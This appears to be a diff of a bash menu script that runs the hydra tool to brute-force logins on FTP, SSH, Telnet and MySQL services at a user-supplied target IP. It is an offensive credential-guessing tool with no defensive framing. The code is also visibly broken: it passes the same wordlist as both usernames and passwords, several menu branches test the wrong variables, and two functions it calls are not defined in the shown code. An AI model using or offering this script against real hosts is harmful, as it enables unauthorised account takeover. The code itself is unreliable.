@@ -1,7 +1,59 @@
 #!/bin/bash
+choosefile(){
+    echo "<--------------------For Username wordlist-------------------------->"
+    echo "1. Username"
+    echo "2. Password file"
+    echo "3.Custom"
+    echo "<-------------------------------------------------------------------->"
+    read choice
+    if [ $choice -eq 1 ];
+    then
+        username
+    elif [ $choice -eq 2 ];
+    then
+        passwordfile
+    elif [ $choice -eq 3 ];
+    then
+        echo "Enter the destination or name of file"
+        read wordlist
+    fi
+}
 ftp(){
-        service=ftp
-        hydra $service://$targetip:$targetport -L username -P passwodfile -V 
+    echo "Enter Target ip"
+    read targetip
+    echo "Enter the time you want it pe repeat"
+    read time
+    service=ftp
+    choosefile
+    hydra -L $wordlist -P $wordlist $service://$targetip -V -t $time
+}
+ssh(){
+    echo "Enter Target ip"
+    read targetip
+    echo "Enter the time you want it pe repeat"
+    read time
+    service=ssh
+    choosefile
+    hydra -L $wordlist -P $wordlist $service://$targetip -V -t $time
+
+}
+telnet(){
+    echo "Enter Target ip"
+    read targetip
+    echo "Enter the time you want it pe repeat"
+    read time
+    service=telnet
+    choosefile
+    hydra -L $wordlist -P $wordlist $service://$targetip -V -t $time
+}
+mysql(){
+    echo "Enter Target ip"
+    read targetip
+    echo "Enter the time you want it pe repeat"
+    read time
+    service=mysql
+    choosefile
+    hydra -L $wordlist -P $wordlist $service://$targetip -V -t $time
 }
 yourdirect(){
     direct=/home/hatakekakashi/
@@ -639,35 +691,21 @@ then
     echo "1.FTP"
     echo "2.SSH"
     echo "3.Telnet"
-    echo "4.Smb"
+    echo "4.MySql"
     echo "<------------------------------------------------------------------->"
     read oi
     if [ $oi -eq 1 ];
     then
-        echo "<--------------------SELECT THE SERVICE TYPE------------------------>"
-        echo "1.FTP"
-        echo "2.SSH"
-        echo "3.Telnet"
-        echo "4.Smb"
-        echo "<------------------------------------------------------------------->"
-        read lo
-        if [ $lo -eq 1 ];
-        then
-            echo "Enter target ip"
-            read targetip
-            echo "Enter target port or leave blank"
-            read targetport
-            echo "1.Custom Details"
-            echo "2.Built in function"
-            read il
-            if [ $il -eq 1 ];
-            then
-                ftp
-            elif [ $il -eq 2 ];
-            then
-                ftp
-            fi
-        fi
+           ftp
+    elif [ $ol -eq 2 ];
+    then
+            ssh
+    elif [ $choice -eq 3 ];
+    then
+        telnet
+    elif [ $choice -eq 4 ];
+    then
+        mysql
     fi
 elif [ $type -eq 2 ];
 then
